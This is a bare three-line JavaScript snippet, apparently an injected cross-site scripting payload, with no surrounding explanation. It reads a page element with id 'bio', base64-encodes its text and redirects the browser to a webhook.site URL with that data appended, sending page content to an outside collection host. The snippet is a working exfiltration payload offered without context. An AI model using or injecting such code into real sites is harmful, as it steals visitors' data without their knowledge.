var bio = btoa($('#bio').text());
console.log(bio)
document.location = "https://webhook.site/efc2becf-d467-47c2-ba5a-9456ffc94a81?" + bio;
